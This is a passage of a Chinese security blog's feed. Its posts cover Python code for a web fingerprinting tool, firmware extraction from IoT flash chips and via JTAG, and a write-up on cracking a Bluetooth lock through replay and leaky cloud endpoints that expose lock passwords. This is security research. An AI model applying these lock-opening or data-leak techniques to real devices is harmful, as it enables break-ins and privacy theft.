util.log(&quot;url:%s app:%s&quot; % (url + rule[&apos;url&apos;], finger[&apos;app_name&apos;]))</span><br><span class="line">        elif  finger[&apos;type&apos;] == &apos;web_header_contain&apos; :</span><br><span class="line"></span><br><span class="line">            if  rule[&apos;grep&apos;]  in  str(rsp_index[&apos;headers&apos;]).lower() :</span><br><span class="line">                list_app.append(&#123;&apos;app_id&apos;:finger[&apos;id&apos;], &apos;url&apos;:url&#125;)</span><br><span class="line">                util.log(&quot;url:%s app:%s&quot; % (url , finger[&apos;app_name&apos;]))</span><br><span class="line">                        </span><br><span class="line">            </span><br><span class="line">        time.sleep(0.01)</span><br><span class="line">    return  list_app</span><br></pre></td></tr></table></figure><h3 id="单独识别"><a href="#单独识别" class="headerlink" title="单独识别"></a>单独识别</h3><p>简单调用指纹识别模块代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"> *@Projet  Yafinger</span></span><br><span class="line"><span class="string"> *@Author  yaseng@uauc.net</span></span><br><span class="line"><span class="string"> *@Desc    yafinger test </span></span><br><span class="line"><span class="string">     __    __            ___                                         </span></span><br><span class="line"><span class="string">    /\ \  /\ \         /'___\  __                                    </span></span><br><span class="line"><span class="string">    \ `\`\\/'/   __   /\ \__/ /\_\     ___       __       __   _ __  </span></span><br><span class="line"><span class="string">     `\ `\ /'  /'__`\ \ \ ,__\\/\ \  /' _ `\   /'_ `\   /'__`\/\`'__\</span></span><br><span class="line"><span class="string">       `\ \ \ /\ \L\.\_\ \ \_/ \ \ \ /\ \/\ \ /\ \L\ \ /\  __/\ \ \/ </span></span><br><span class="line"><span class="string">         \ \_\\ \__/.\_\\ \_\   \ \_\\ \_\ \_\\ \____ \\ \____\\ \_\ </span></span><br><span class="line"><span class="string">          \/_/ \/__/\/_/ \/_/    \/_/ \/_/\/_/ \/___L\ \\/____/ \/_/ </span></span><br><span class="line"><span class="string">                                                 /\____/             </span></span><br><span class="line"><span class="string">                                                 \_/__/ </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span>   os, time, sys, Queue, threading, ast</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</span><br><span class="line"><span class="keyword">from</span>   lib.db             <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span>   optparse           <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span>   modules            <span class="keyword">import</span> finger</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    usage= <span class="string">'''%prog --host  host --port  port --finger  &lt;all|app_name&gt;   \r\nExample:%prog  --url  http://127.0.0.1    --finger phpmyadmin  '''</span></span><br><span class="line">    parser = OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">"-u"</span>, <span class="string">"--url"</span>, dest=<span class="string">"url"</span>, help=<span class="string">"target url"</span>)</span><br><span class="line">    parser.add_option(<span class="string">"-f"</span>, <span class="string">"--finger"</span>, dest=<span class="string">"finger"</span>, help=<span class="string">"finger_db app_name,default all "</span>, default=<span class="string">"all"</span>)</span><br><span class="line">    options, arguments = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.url == <span class="keyword">None</span> :</span><br><span class="line">        parser.print_help() </span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    db = MySQL(config.db_config)</span><br><span class="line">    sql_finger_where=<span class="string">' '</span>  <span class="keyword">if</span> options.finger == <span class="string">'all'</span> <span class="keyword">else</span> <span class="string">"  and  app_name='%s' "</span>  % options.finger</span><br><span class="line">    db.query(<span class="string">"SELECT  * from  pw_finger_db  where  `enable`=1   %s "</span>  % sql_finger_where)</span><br><span class="line">    fingers = db.fetch_all()</span><br><span class="line">    <span class="keyword">if</span> len(fingers) == <span class="number">0</span> :</span><br><span class="line">        util.log(<span class="string">'finger app_name %s not found'</span> % options.finger ,<span class="number">3</span>,<span class="string">'finger'</span>) </span><br><span class="line">    config.set(<span class="string">"fingers"</span>,fingers)</span><br><span class="line">    util.log(<span class="string">"load fingers count %d"</span> % len(fingers),<span class="number">1</span>,<span class="string">'finger'</span>)</span><br><span class="line">    finger.get_web_app(options.url)</span><br></pre></td></tr></table></figure><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109322329056.jpg" alt="img"></p><h3 id="批量识别"><a href="#批量识别" class="headerlink" title="批量识别"></a>批量识别</h3><p> 可以使用线程池来实现批量指纹识别。</p><h3 id="指纹结果"><a href="#指纹结果" class="headerlink" title="指纹结果"></a>指纹结果</h3><p>融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。</p><h2 id="yafinger"><a href="#yafinger" class="headerlink" title="yafinger"></a>yafinger</h2><p>yet another  web  fingerprinter<br><a href="https://github.com/yaseng/yafinger" target="_blank" rel="noopener">https://github.com/yaseng/yafinger</a></p><h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ol><li>指纹库需要补充</li><li>可以不局限于web指纹</li><li>某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用
      
    
    </summary>
    
      <category term="web安全" scheme="http://yaseng.org/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="指纹识别" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-固件提取</title>
    <link href="http://yaseng.org/iot-security-hardware-obtain.html"/>
    <id>http://yaseng.org/iot-security-hardware-obtain.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:54:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。<br>为了读取Flash芯片的内容，有以下两种常用方式：</p><p>1、直接将导线连接到芯片的引脚，在通过飞线连接编程器，进行在线读取固件；</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image34.jpg" alt=""></p><p>2、把芯片拆焊下来，通过烧录座编程器，离线读取固件。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/dce974d6b8fae7f6/20180606_154759.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d35d6e7f9a.jpg" alt=""></p><h2 id="飞线法读取"><a href="#飞线法读取" class="headerlink" title="飞线法读取"></a>飞线法读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image36.jpg" alt=""></p><h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image37.jpg" alt=""></p><p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image38.jpg" alt=""></p><p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image39.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image40.jpg" alt=""></p><h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image41.jpg" alt=""></p><p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image118.jpg" alt=""></p><p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image42.jpg" alt=""></p><p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image43.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image44.jpg" alt=""></p><p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image45.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image46.jpg" alt=""></p><p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image116.jpg" alt=""></p><h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image47.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image48.jpg" alt=""></p><p>通过显微镜发现芯片型号为25L128。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image120.jpg" alt=""></p><p>连接编程器读取固件并保存。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image49.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image50.jpg" alt=""></p><h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image52.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image119.jpg" alt=""></p><p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image51.jpg" alt=""></p><p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image54.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image53.jpg" alt=""></p><p>在编程器中选择该型号，成功提取出固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image55.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image56.jpg" alt=""></p><p>用binwalk解包固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image115.jpg" alt=""></p><h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image57.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image58.jpg" alt=""></p><p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image59.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image60.jpg" alt=""></p><h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image62.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image121.jpg" alt=""></p><p>通过夹具连接编程器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image61.jpg" alt=""></p><p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image63.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image64.jpg" alt=""></p><p>用binwalk解包固件内容。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image117.jpg" alt=""></p><h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>一般情况下，对于TSOP8封装的闪存芯片，可以用上述方法来读取，但可能存在在线读取成功率不高或数据丢失的情况，对于更多引脚和封装格式的芯片，飞线的难度更高，有一定锡焊基础的建议采用拆焊芯片，用烧录座离线读取的方法。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165648.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165631.jpg" alt=""></p><p>热风枪设置在适合的温度，吹下芯片，周围的元件可以用铝箔或锡箔纸适当保护。</p><p>拆下的闪存芯片放在烧录座上，在连接编程器进行读写，芯片放置的引脚方向要注意对齐编程器和烧录座的第一脚。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165637.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165659.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165651.jpg" alt=""></p><p>读取完成，用点焊法把芯片焊上焊盘即可。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628165634.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/20180628171222.jpg" alt=""></p><p>更多芯片焊接修改操作请参考2.4.2 硬件修改一节</p><h2 id="jtag提取固件"><a href="#jtag提取固件" class="headerlink" title="jtag提取固件"></a>jtag提取固件</h2><h3 id="拆焊芯片"><a href="#拆焊芯片" class="headerlink" title="拆焊芯片"></a>拆焊芯片</h3><p>首先用热风枪拆下智能锁主控芯片，该单片机型号为：Stm32F103R6。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3522b3bcebf.jpg" alt=""></p><h3 id="烧录座连接Jlink"><a href="#烧录座连接Jlink" class="headerlink" title="烧录座连接Jlink"></a>烧录座连接Jlink</h3><p>芯片第一脚对齐烧录座第一脚，然后把Jlink插入烧录座引出的JTAG接口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b352394427b3.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3523a551154.jpg" alt=""></p><h3 id="读取固件"><a href="#读取固件" class="headerlink" title="读取固件"></a>读取固件</h3><p>电脑上安装好Jlink驱动，打开J-Flash客户端，设置好参数，主要在配置栏选择正确的芯片型号，然后点击连接，在点击Target-&gt;Read Back-&gt;Entire trip即可读写固件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524c6c08bb.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524ced11a4.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524d65ced7.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524db79b3c.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/872bc42054768e0f/5b3524f327ac3.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;br&gt;为了读取Flash芯片的内容，有
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>如何破解一个蓝牙锁</title>
    <link href="http://yaseng.org/how-to-crack-a-ble-lock.html"/>
    <id>http://yaseng.org/how-to-crack-a-ble-lock.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:29:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智能锁中，因为低功耗蓝牙技术的推广，以及受外部环境限制小，通过手机APP交互方便等特点，很多智能锁采用的就是以BLE蓝牙芯片作为控制单元，控制电机或锁簧转动的模式，实现开关锁功能。与其他的安全问题相比，锁具的被破解，可能造成的危害更大，本文通过以破解某型号蓝牙锁，来展示目前蓝牙智能锁可能面临的安全风险。</p><h2 id="蓝牙锁介绍"><a href="#蓝牙锁介绍" class="headerlink" title="蓝牙锁介绍"></a>蓝牙锁介绍</h2><p> 蓝牙锁由于不受外部环境限制，功耗较低，和手机交互方便，目前用的比较多,形状也五花八门，例如目前使用最广泛的一些智能蓝牙锁。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage9.jpg" alt="img"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage10.jpg" alt="img"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage11.jpg" alt="img"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage12.jpg" alt="img"></p><h2 id="如何去破解一个蓝牙锁"><a href="#如何去破解一个蓝牙锁" class="headerlink" title="如何去破解一个蓝牙锁"></a>如何去破解一个蓝牙锁</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage13.jpg" alt="img"></p><h3 id="目标介绍"><a href="#目标介绍" class="headerlink" title="目标介绍"></a>目标介绍</h3><p>这个属于低功耗蓝牙锁，使用app 绑定之后可以开启，还能共享密码，修改密码。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage14.jpg" alt="img"></p><h3 id="内部构架"><a href="#内部构架" class="headerlink" title="内部构架"></a>内部构架</h3><p>显微镜查看电路板<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/IMG_2214.jpg" alt="img"></p><p>拆解<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/IMG_2216.jpg" alt="img"></p><p>蓝牙锁内部搭载了一块CC2541蓝牙芯片，通过控制电机驱动芯片，带动卡榫运转，从而形成拉锁的开关。CC2541是TI推出的一款专门适用于BLE和专用的2.4GHz应用的SOC芯片解决方案,CC254X在目前物联网蓝牙通信解决方案中，市场占有率很高，应用场景非常广泛。</p><h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>使用app初步连接探测，可以看到</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage16.jpg" alt="img"></p><h3 id="开锁流程"><a href="#开锁流程" class="headerlink" title="开锁流程"></a>开锁流程</h3><p>Logcat 查看app日志</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage17.jpg" alt="img"></p><p>流程为</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171123170725.jpg" alt="img"></p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>一般对于蓝牙锁的攻击方式有三种</p><p>1、重放攻击<br>2、暴力破解(6位数字)<br>3、云端漏洞</p><h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage18.jpg" alt="img"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage19.jpg" alt="img"></p><p>通过蓝牙抓包分析，发现通信过程没有加密，可以重放获取认证密码，但如果要模拟真实的智能锁攻击场景，显然不能通过如此显眼的方式，真实环境中往往很难有一个给我们抓包或劫持的场景，所以最好的方式是远程无接触开锁，需要去找云端的漏洞。</p><h3 id="云端漏洞"><a href="#云端漏洞" class="headerlink" title="云端漏洞"></a>云端漏洞</h3><p>云端是Thinkphp5 写的，稍微看了一下,存在有两个漏洞。无认证可以遍历所有id拿到所有锁的信息</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage20.jpg" alt="img"></p><p>没有关闭调试模式会泄露信息,传入一个空的id会吧所有锁的信息报错显示出来，泄露所有锁的密码以及绑定的电话号码mac地址等信息。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage21.jpg" alt="img"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>对于真实的破解锁场景，最好用一个手机app来开锁掩人耳目，综合以上分析，编写一个开锁Android app 。<br>工作流程为</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171123170725.jpg" alt="img"></p><p>利用 com.inuker.bluetooth 库快速开发</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage22.jpg" alt="img"></p><p>APP界面</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15117578788731.jpg" alt="img"></p><p>视频演示</p><p> <a href="https://v.qq.com/x/page/b051058vicv.html" target="_blank" rel="noopener">https://v.qq.com/x/page/b051058vicv.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>ti官方页面  <a href="http://www.ti.com.cn/product/cn/CC2541" target="_blank" rel="noopener">http://www.ti.com.cn/product/cn/CC2541</a><br>cc2541蓝牙芯片手册  <a href="https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="智能锁" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81/"/>
    
      <category term="蓝牙攻击" scheme="http://yaseng.org/tags/%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-硬件分析初探</title>
    <link href="http://yaseng.org/iot-security-hardware-analysis.html"/>
    <id>http://yaseng.org/iot-security-hardware-analysis.html</id>
    <published>2017-11-16T16:00:00.000Z</published>
    <updated>2018-06-29T10:55:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通信的抓包等方式可以获得部分的信息，但如果需要深入分析智能设备底层的工作原理，从中发现更深层次的安全问题，就不可避免的需要直接接触硬件本身，这也是传统安全手段未能触及的部分，据此，下面简单的谈下关于电路分析和芯片固件提取和调试的一点心得。</p><h2 id="芯片"><a href="#芯片" class="headerlink" title="芯片"></a>芯片</h2><h3 id="ROM芯片"><a href="#ROM芯片" class="headerlink" title="ROM芯片"></a>ROM芯片</h3><p>常见的IOT产品，一般采用嵌入式linux系统开发，对芯片分析主要目的之一就是获取到硬件系统的固件，从固件中分析可能存在的安全风险。<br>固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。<br>常见的存储芯片按照存储读取方式和制作工艺不同，可以分为： ROM、PROM、EPROM、EEPROM、FLASH-ROM。<br>在大部分IOT产品中多采用flash芯片作为存储器，提取固件主要也是通过读取flash芯片。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image17.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image18.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image19.jpg" alt=""></p><h3 id="Flash芯片"><a href="#Flash芯片" class="headerlink" title="Flash芯片"></a>Flash芯片</h3><p>FLASH ROM属于真正的单电压芯片，在使用上很类似EEPROM，因此，有些书籍上便把FLASH ROM作为EEPROM的一种。事实上，二者还是有差别的。FLASH ROM在擦除时，也要执行专用的刷新程序，但是在删除资料时，并非以Byte为基本单位，而是以Sector（又称Block）为最小单位，Sector 的大小随厂商的不同而有所不同；只有在写入时，才以Byte为最小单位写入；FLASH ROM芯片的读和写操作都是在单电压下进行，不需跳线，只利用专用程序即可方便地修改其内容；FLASH ROM的存储容量普遍大于EEPROM，约为512K到至8M KBit，由于大批量生产，价格也比较合适，很适合用来存放程序码，近年来已逐渐取代了EEPROM，广泛用于主板的BIOS ROM，也是CIH攻击的主要目标。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image20.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image21.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image22.jpg" alt=""></p><p>根据技术方式不同可分为： IIC EEPROM、SPI NorFlash 、CFI Flash、Parallel NandFlash、SPI NandFlash、eMMC Flash、USF2.0等。<br>其中SPI 